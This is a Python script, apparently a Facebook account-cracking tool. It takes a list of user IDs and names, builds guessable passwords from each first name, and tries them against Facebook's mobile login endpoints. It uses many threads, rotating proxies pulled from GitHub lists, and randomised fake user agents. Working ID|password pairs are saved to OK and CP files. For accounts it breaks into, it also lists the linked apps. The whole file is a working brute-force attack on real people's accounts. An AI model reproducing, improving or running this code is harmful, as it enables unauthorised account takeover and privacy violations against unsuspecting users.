import os
import sys
import time
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://www.javatpoint.com/proxy-server-list').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/B51Fire1/proxy/main/Proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/a7a-7iz/proxy.txt/main/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt').text
	open('.proxy.txt','w').write(prox)
except Exception as e:
	prox=open('.proxy.txt','r').read().splitlines()

try: 
	prox= requests.get('https://github.com/VAMPIRE/VAMPIRE/blob/main/.SALE-IP.txt').text
	open('.VAMPIRE-IP.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.VAMPIRE-IP.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('VAMPIRE-MOBILE.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/VAMPIRE/VAMPIREFB/blob/main/.VAMPIRE-MOBILE.txt').text
		ua=open('.VAMPIRE-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.VAMPIRE-MOBILE.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
def banner():
	clear()
	print(""" \x1b[38;5;197m

╭━━━━┳━━━┳━╮╱╭┳╮╱╱╭┳━━━╮
┃╭╮╭╮┃╭━╮┃┃╰╮┃┃╰╮╭╯┃╭━╮┃
╰╯┃┃╰┫┃╱┃┃╭╮╰╯┣╮╰╯╭┫┃╱┃┃
╱╱┃┃╱┃╰━╯┃┃╰╮┃┃╰╮╭╯┃╰━╯┃
╱╱┃┃╱┃╭━╮┃┃╱┃┃┃╱┃┃╱┃╭━╮┃
╱╱╰╯╱╰╯╱╰┻╯╱╰━╯╱╰╯╱╰╯╱╰╯
                                                     

""")

def menu():
	os.system('clear')
	banner()
	print('')
	print('')
	print(' \x1b[38;5;167m[\033[1;92m01\x1b[38;5;167m] \x1b[38;5;168mCrack File ')
	print('')
	print('')
	sale = input(f' \033[1;37mHALBZHERA = ')
	print('')
	if sale in ['1','01']:
		File()
		back()

def File():
	os.system('clear')
	banner()
	try:
		print('')
		print('')
		jum = input(' File Dane = ')
		print('')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print(' Hamo Idyakan = '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(' NO CONNECTION  ')
			exit()
	except (KeyError,IOError):
			print(' IS NOT FILE ')
			time.sleep(3)
			follower()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
	banner()

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		exit()
	clear()
	banner()
	method.append('mobile')
	clear()
	banner()
	print('')
	print('')
	pwplus=input(f' \x1b[38;5;98mAutoPassword [ Y/n ] = ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f' \x1b[38;5;98mAutoPassword [ Y/n ] = ')
		print('')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
# Method Main
def passwrd():
	os.system('clear')
	banner()
	print("")
	print("")
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'12@')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+'1234'+frs)
					pwv.append(frs+'12345'+frs)
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append(frs+'@12')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'123456'+frs)
					pwv.append(frs+'1234567'+frs)
					pwv.append(frs+'12345678'+frs)
					pwv.append('123456'+frs+'123456')
					pwv.append('1234567'+frs+'1234567')
					pwv.append('12345678'+frs+'12345678')
			else:
					pwv.append(nmf)
					pwv.append(frs+'12@')
					pwv.append(frs+'123@')
					pwv.append(frs+'1234@')
					pwv.append(frs+'12345@')
					pwv.append(frs+'1122')
					pwv.append(frs+'112233')
					pwv.append(frs+'1212')
					pwv.append(frs+'123123')
					pwv.append(frs+'123321')
					pwv.append(frs+'123'+frs)
					pwv.append(frs+'1234'+frs)
					pwv.append(frs+'12345'+frs)
					pwv.append('123'+frs+'123')
					pwv.append('1234'+frs+'1234')
					pwv.append('12345'+frs+'12345')
					pwv.append(frs+'@12')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'@12345')
					pwv.append(frs+'123456'+frs)
					pwv.append(frs+'1234567'+frs)
					pwv.append(frs+'12345678'+frs)
					pwv.append('123456'+frs+'123456')
					pwv.append('1234567'+frs+'1234567')
					pwv.append('12345678'+frs+'12345678')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print(' OK : %s '%(ok))
	print(' CP : %s '%(cp))
	print('')
	exit()

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r \033[1;37mTANYA = {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			proxs= {'http': 'socks5://'+nip}
			proxs= {'http': 'socks://'+nip}
			proxs= {'http': '.http.txt://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m[TANYA-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;37m[TANYA-\033[1;92mOK\033[1;37m] \033[1;92m {idf} | {pw}')
				open('/storage/emulated/0/TANYA-OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r \033[1;37mTANYA = {loop}\033[1;90m-\033[1;37m{len(id)} \033[1;92mOK\033[1;90m-\033[1;93mCP\033[1;90m = \033[1;92m{ok}\033[1;90m-\033[1;93m{cp}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			proxs= {'http': 'socks5://'+nip}
			proxs= {'http': 'socks://'+nip}
			proxs= {'http': '.http.txt://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com', 'upgrade-insecure-requests': '1', 'user-agent': 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': 'https://developers.facebook.com/', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa = {'lsd': re.search('name="lsd" value="(.*?)"', str(p)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"', str(p)).group(1), 'uid': idf, 'flow': 'login_no_pin', 'pass': pw, 'next': 'https://developers.facebook.com/tools/debug/accesstoken/'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;37m[TANYA-\033[1;93mCP\033[1;37m] \033[1;93m {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;37m[TANYA-\033[1;92mOK\033[1;37m] \033[1;92m {idf} | {pw}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------#
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s[TANYA]%s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s[TANYA]---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s[TANYA]---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[TANYA%s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
#--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------#
def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s[TANYA]%s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s[TANYA]%s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[TANYA]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[TANYA]%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[TANYA]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[TANYA]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[TANYA]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# '
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	menu()